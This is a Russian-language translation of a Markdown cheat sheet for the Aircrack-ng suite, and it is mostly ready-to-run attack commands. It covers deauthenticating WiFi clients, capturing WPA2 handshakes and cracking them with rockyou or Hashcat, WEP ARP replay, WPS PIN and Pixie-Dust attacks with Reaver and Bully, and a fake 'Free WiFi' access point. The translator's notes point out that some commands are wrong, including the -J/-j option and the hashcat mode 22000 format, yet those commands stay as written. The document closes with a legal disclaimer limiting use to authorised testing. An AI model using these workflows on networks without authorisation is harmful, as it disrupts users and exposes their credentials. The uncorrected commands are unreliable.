<a id="-aircrack-ng---wifi-hacking-suite-cheatsheet"></a>
# 📶 Aircrack-ng — шпаргалка по набору инструментов для тестирования WiFi

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 Английский оригинал](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [📚 Русское оглавление](../../README.ru.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Инструменты для тестирования WiFi
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Aircrack-ng](#-what-is-aircrack-ng)
- [Установка](#-installation)
- [Режим мониторинга](#-monitor-mode)
- [Разведка (airodump-ng)](#-reconnaissance-airodump-ng)
- [Деаутентификация (aireplay-ng)](#-deauthentication-aireplay-ng)
- [Подбор ключей WPA/WPA2](#-wpawpa2-cracking)
- [Взлом WEP](#-wep-cracking)
- [Атаки на WPS](#-wps-attacks)
- [Дополнительные инструменты](#-additional-tools)
- [Полная последовательность атаки](#-complete-attack-workflow)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-aircrack-ng"></a>
## 🎯 Что такое Aircrack-ng

**Aircrack-ng** — набор инструментов для оценки безопасности сетей WiFi. В него входят:

- 📡 **airodump-ng** — захват пакетов и обнаружение сетей
- 💥 **aireplay-ng** — инъекция пакетов (packet injection) и атаки деаутентификации
- 🔓 **aircrack-ng** — восстановление ключей WEP и WPA/WPA2
- 🔧 **airmon-ng** — включение и отключение режима мониторинга (monitor mode)
- 📝 **airodecap-ng** — расшифровка захваченного трафика

> **Уточнение перевода:** в перечне оригинала опечатка: утилита расшифровки называется **airdecap-ng**, как и в разделе ниже. См. [официальный сайт Aircrack-ng](https://www.aircrack-ng.org/).

<a id="requirements"></a>
### Требования

| Требование | Описание |
|-------------|-------------|
| **Беспроводной адаптер** | Должен поддерживать режим мониторинга и инъекцию пакетов |
| **Поддерживаемые чипсеты** | Atheros, Ralink, Realtek (некоторые) |
| **Операционная система** | Рекомендуется Linux (Kali) |

<a id="popular-compatible-adapters"></a>
### Популярные совместимые адаптеры

| Адаптер | Чипсет | Примечания |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | Два диапазона, высокая мощность |
| Alfa AWUS036NHA | Atheros AR9271 | Проверенный, надёжный вариант |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Бюджетный вариант |

> **Совместимость оборудования:** поддержка зависит от аппаратной ревизии, чипсета и драйвера. Само название модели не гарантирует ни режим мониторинга, ни инъекцию; возможности драйвера проверяются отдельно. См. [документацию Aircrack-ng по драйверам](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers).

---

<a id="-installation"></a>
## 🚀 Установка

<a id="kali-linux-pre-installed"></a>
### Kali Linux (предустановлен)

```bash
# Уже установлен: проверка версии
aircrack-ng --version

# Обновление
sudo apt update && sudo apt install aircrack-ng
```

> **Примечание о версии:** пример с `--version` сохранён из оригинала. В [текущем исходном коде Aircrack-ng](https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/src/aircrack-ng/aircrack-ng.c) такого длинного параметра нет; версия выводится в заголовке справки `--help`. Наличие предустановленного пакета зависит от образа Kali.

<a id="debianubuntu"></a>
### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

<a id="from-source"></a>
### Сборка из исходного кода

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

<a id="-monitor-mode"></a>
## 📡 Режим мониторинга

<a id="check-wireless-interface"></a>
### Проверка беспроводного интерфейса

```bash
# Список беспроводных интерфейсов
iwconfig

# Или
iw dev

# Или
airmon-ng
```

<a id="enable-monitor-mode"></a>
### Включение режима мониторинга

```bash
# Способ 1: airmon-ng (рекомендуется)
sudo airmon-ng start wlan0

# Output: Monitor mode enabled on wlan0mon

# Способ 2: вручную
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

<a id="kill-interfering-processes"></a>
### Завершение мешающих процессов

```bash
# Завершить процессы, которые могут мешать работе
sudo airmon-ng check kill

# Или вручную
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

<a id="disable-monitor-mode"></a>
### Отключение режима мониторинга

```bash
# Остановить режим мониторинга
sudo airmon-ng stop wlan0mon

# Перезапустить NetworkManager
sudo systemctl start NetworkManager
```

<a id="change-channel"></a>
### Смена канала

```bash
# Задать конкретный канал
sudo iwconfig wlan0mon channel 6

# Или с помощью airmon-ng
sudo airmon-ng start wlan0 6
```

---

<a id="-reconnaissance-airodump-ng"></a>
## 🔍 Разведка (airodump-ng)

<a id="basic-scan"></a>
### Базовое сканирование

```bash
# Поиск всех сетей
sudo airodump-ng wlan0mon

# Пример вывода:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

<a id="scan-specific-band"></a>
### Сканирование определённого диапазона

```bash
# Только 2.4GHz
sudo airodump-ng --band g wlan0mon

# Только 5GHz
sudo airodump-ng --band a wlan0mon

# Оба диапазона
sudo airodump-ng --band abg wlan0mon
```

<a id="target-specific-network"></a>
### Выбор конкретной сети

```bash
# Фильтр по каналу и BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Записать захваченные пакеты в файл
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Создаёт: capture-01.cap, capture-01.csv и другие файлы
```

<a id="understanding-output"></a>
### Как читать вывод

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Поле | Описание |
|-------|-------------|
| BSSID | MAC-адрес точки доступа (AP) |
| PWR | Уровень сигнала (чем ближе к 0, тем сильнее) |
| Beacons | Количество маяковых кадров (beacon frames) |
| #Data | Количество пакетов данных |
| CH | Канал |
| ENC | Тип шифрования (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Имя сети |
| STATION | MAC-адрес подключённого клиента |

<a id="filter-options"></a>
### Параметры фильтрации

```bash
# Показывать только зашифрованные сети
sudo airodump-ng --encrypt wpa2 wlan0mon

# Показывать только WEP
sudo airodump-ng --encrypt wep wlan0mon

# Конкретный ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

<a id="-deauthentication-aireplay-ng"></a>
## 💥 Деаутентификация (aireplay-ng)

<a id="why-deauth"></a>
### Зачем нужна деаутентификация?

Деаутентификация (deauth) заставляет клиентов подключиться заново, что позволяет захватить четырёхстороннее рукопожатие (4-way handshake), необходимое для подбора ключа WPA/WPA2.

<a id="deauth-single-client"></a>
### Деаутентификация одного клиента

```bash
# Деаутентификация конкретного клиента
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Атака деаутентификации
# 5  : Количество деаутентификаций (0 = бесконечно)
# -a : BSSID точки доступа
# -c : MAC-адрес клиента
```

> **Уточнение счётчика:** число после `-0` задаёт количество групп кадров деаутентификации, а не отдельных кадров; `0` означает непрерывную отправку. См. [документацию aireplay-ng](https://www.aircrack-ng.org/doku.php?id=deauthentication).

<a id="deauth-all-clients"></a>
### Деаутентификация всех клиентов

```bash
# Широковещательная деаутентификация (все клиенты)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Более агрессивный вариант
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

<a id="check-for-handshake"></a>
### Проверка наличия рукопожатия

```
# В airodump-ng найдите:
WPA handshake: AA:BB:CC:DD:EE:FF

# Эта надпись появляется в правом верхнем углу
```

---

<a id="-wpawpa2-cracking"></a>
## 🔓 Подбор ключей WPA/WPA2

> **Область применения:** здесь описан подбор **WPA/WPA2-PSK** по кандидатам паролей. Он сработает, только если подходящий кандидат есть в словаре; наличие рукопожатия само по себе не раскрывает пароль. Это не универсальный способ взлома Enterprise или WPA3. См. [документацию Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng).

<a id="complete-wpa2-attack-workflow"></a>
### Полная последовательность атаки на WPA2

```bash
# Шаг 1: включить режим мониторинга
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Шаг 2: найти сети
sudo airodump-ng wlan0mon

# Шаг 3: выбрать конкретную сеть и захватывать пакеты
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Шаг 4: деаутентифицировать клиента (в новом терминале)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Шаг 5: дождаться рукопожатия (отображается в airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Шаг 6: подобрать пароль по словарю
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

<a id="dictionary-attack"></a>
### Атака по словарю

```bash
# Базовый подбор по словарю
aircrack-ng -w wordlist.txt capture-01.cap

# Использовать rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Несколько словарей
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

<a id="specify-target-essid"></a>
### Указание ESSID целевой сети

```bash
# Если в захваченном трафике есть несколько сетей
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Или по BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

<a id="using-hashcat-faster-gpu"></a>
### Использование Hashcat (ускорение на GPU)

```bash
# Преобразовать cap в формат hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Создаёт: hashcat_file.hccapx

# Или использовать cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Подбор с помощью Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 для старого формата hccap
```

> **Исправление неточностей оригинала:** согласно [документации Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng), `-J` создаёт старый HCCAP, а `-j` — HCCAPX. Поэтому комментарий о `hashcat_file.hccapx` после `-J` неточен. Режим Hashcat `22000` принимает текстовый формат PMKID/EAPOL, а не бинарный `.hccapx`; примеры ниже и в полном сценарии сохраняют эту ошибку оригинала. Актуальный путь преобразования описан в [официальной вики Hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2): исходный захват обрабатывается совместимой версией hcxpcapngtool. Старый режим `2500` относится к HCCAP, как и указано в исходном комментарии.

<a id="convert-formats"></a>
### Преобразование форматов

```bash
# Из CAP в HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# Из CAP в PCAP
editcap capture-01.cap output.pcap

# Объединить несколько файлов cap
mergecap -w merged.cap capture-01.cap capture-02.cap
```

> **Уточнение формата:** современный editcap по умолчанию записывает pcapng; расширение `output.pcap` само по себе не выбирает PCAP. Формат вывода задаётся параметром `-F`. Команда оригинала сохранена. См. [официальное руководство editcap](https://www.wireshark.org/docs/man-pages/editcap.html).

---

<a id="-wep-cracking"></a>
## 🔐 Взлом WEP

> ⚠️ WEP устарел и небезопасен. В большинстве сетей теперь используется WPA2/WPA3.

<a id="wep-attack-types"></a>
### Типы атак на WEP

| Атака | Описание |
|--------|-------------|
| ARP Replay | Захват и повторная передача ARP-пакетов |
| Fake Auth | Ассоциация с точкой доступа без ключа |
| Fragmentation | Получение ключевого потока |
| ChopChop | Расшифровка пакетов без ключа |

<a id="basic-wep-attack"></a>
### Базовая атака на WEP

```bash
# Шаг 1: захватывать трафик
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Шаг 2: выполнить поддельную аутентификацию
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Шаг 3: повторно передавать ARP-пакеты
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Шаг 4: восстанавливать ключ после накопления достаточного количества IV (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

> **Уточнение по WEP:** IV — вектор инициализации. Значение `>50,000` в примере не гарантирует восстановление ключа: результат зависит от метода, длины ключа и пригодности пакетов. Для PTW важен тип трафика; некоторые старые численные рекомендации в вики относятся к прежним методам. См. [официальное описание Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng).

<a id="aireplay-ng-attack-modes"></a>
### Режимы атак aireplay-ng

| Режим | Описание |
|------|-------------|
| `-0` | Деаутентификация |
| `-1` | Поддельная аутентификация |
| `-2` | Интерактивная повторная передача пакетов |
| `-3` | Повторная передача ARP-запросов |
| `-4` | Атака KoreK chopchop |
| `-5` | Атака фрагментации |
| `-9` | Проверка инъекции пакетов |

---

<a id="-wps-attacks"></a>
## 🔓 Атаки на WPS

<a id="using-reaver"></a>
### Использование Reaver

```bash
# Установить Reaver
sudo apt install reaver

# Базовая атака на WPS
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# С указанием канала
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Атака Pixie-Dust (быстрее)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

<a id="using-bully"></a>
### Использование Bully

```bash
# Установить Bully
sudo apt install bully

# Базовая атака
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

<a id="wash-find-wps-enabled-aps"></a>
### Wash (поиск точек доступа с включённым WPS)

```bash
# Поиск сетей с WPS
sudo wash -i wlan0mon

# Пример вывода:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

> **Уточнение по WPS:** Reaver, Bully и Wash — отдельные инструменты. Pixie-Dust работает лишь с уязвимыми реализациями WPS и не является гарантированным ускорением для любой точки доступа. См. [документацию разработчиков Reaver](https://github.com/t6x/reaver-wps-fork-t6x).

---

<a id="-additional-tools"></a>
## 🔧 Дополнительные инструменты

<a id="airbase-ng-fake-ap"></a>
### airbase-ng (поддельная точка доступа)

```bash
# Создать поддельную точку доступа
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# С конкретным BSSID
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

<a id="airdecap-ng-decrypt-captures"></a>
### airdecap-ng (расшифровка захваченного трафика)

```bash
# Расшифровать захваченный трафик WPA с известным ключом
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Расшифровать захваченный трафик WEP
airdecap-ng -w <wep_key> capture-01.cap
```

<a id="aircrack-ng-options"></a>
### Параметры aircrack-ng

```bash
# Показать все параметры
aircrack-ng --help

# Использовать несколько ядер CPU
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Тихий режим
aircrack-ng -q -w wordlist.txt capture-01.cap

# Указать ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

<a id="packetforge-ng-create-packets"></a>
### packetforge-ng (создание пакетов)

```bash
# Создать ARP-пакет
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

<a id="-complete-attack-workflow"></a>
## 🎯 Полная последовательность атаки

<a id="wpa2-attack-step-by-step"></a>
### Атака на WPA2 (пошагово)

```bash
# Терминал 1: подготовка
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Проверить режим мониторинга
iwconfig  # Должен отображаться wlan0mon

# Терминал 1: поиск сетей
sudo airodump-ng wlan0mon
# Записать BSSID, CH, ESSID целевой сети

# Терминал 1: выбрать цель и захватывать трафик
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Терминал 2: атака деаутентификации
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Дождаться надписи "WPA handshake: XX:XX:XX:XX:XX:XX" в терминале 1
# Нажать Ctrl+C, чтобы остановить захват

# Терминал 1: подобрать пароль по рукопожатию
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Или с помощью Hashcat (GPU — быстрее)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

<a id="post-attack-cleanup"></a>
### Очистка после атаки

```bash
# Остановить режим мониторинга
sudo airmon-ng stop wlan0mon

# Перезапустить NetworkManager
sudo systemctl start NetworkManager

# Удалить файлы (необязательно)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Задача | Команда |
|---------|---------|
| Включить режим мониторинга | `airmon-ng start wlan0` |
| Отключить режим мониторинга | `airmon-ng stop wlan0mon` |
| Завершить мешающие процессы | `airmon-ng check kill` |
| Найти сети | `airodump-ng wlan0mon` |
| Выбрать целевую сеть | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Деаутентифицировать | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Подобрать ключ WPA | `aircrack-ng -w wordlist.txt capture.cap` |

<a id="attack-summary"></a>
### Обзор атак

| Атака | Шифрование | Метод |
|--------|------------|--------|
| По словарю | WPA/WPA2 | Захват рукопожатия → подбор пароля по словарю |
| Reaver | WPS | Полный перебор WPS PIN |
| Pixie-Dust | WPS | Автономная атака на WPS |
| ARP Replay | WEP | Накопление IV → восстановление ключа |

<a id="useful-wordlists"></a>
### Полезные словари

| Путь | Описание |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | Наиболее распространённый (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Быстрая проверка |
| `/usr/share/seclists/Passwords/` | Коллекция SecLists |

<a id="troubleshooting"></a>
### Устранение неполадок

```bash
# Интерфейс не переходит в режим мониторинга
sudo rfkill unblock wifi
sudo rfkill unblock all

# Проверить, поддерживает ли драйвер инъекцию пакетов
sudo aireplay-ng -9 wlan0mon

# Рукопожатие не захвачено
# - Подойти ближе к цели
# - Попробовать других клиентов
# - Усилить деаутентификацию
# - Подождать дольше

# Airmon сообщает "Found X processes"
sudo airmon-ng check kill
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ Правовое предупреждение

```
⚠️ ВНИМАНИЕ: Используйте эти инструменты только в СВОИХ сетях
или при наличии ЯВНОГО ПИСЬМЕННОГО РАЗРЕШЕНИЯ на тестирование.
Несанкционированный доступ к компьютерным сетям НЕЗАКОНЕН в большинстве юрисдикций.

Ответственные варианты использования:
✅ Аудит безопасности
✅ Тестирование на проникновение (с разрешения)
✅ Обучение (в лабораторной среде)

Недопустимые варианты использования:
❌ Несанкционированный доступ к сети
❌ Кража учётных данных
❌ Любые вредоносные действия
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Официальный сайт Aircrack-ng](https://www.aircrack-ng.org/)
- [Вики Aircrack-ng](https://www.aircrack-ng.org/doku.php)
- [Hashcat: WiFi](https://hashcat.net/wiki/)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Hashcat](../../Hashcat/translations/README.ru.md)
- [Wireshark](../../Wireshark/translations/README.ru.md)
- [Команды Linux](../../Linux-Commands/translations/README.ru.md)

---

<p align="center">
  <b>📶 Освойте тестирование безопасности WiFi!</b><br>
  <i>Aircrack-ng — лучший помощник пентестера беспроводных сетей</i>
</p>
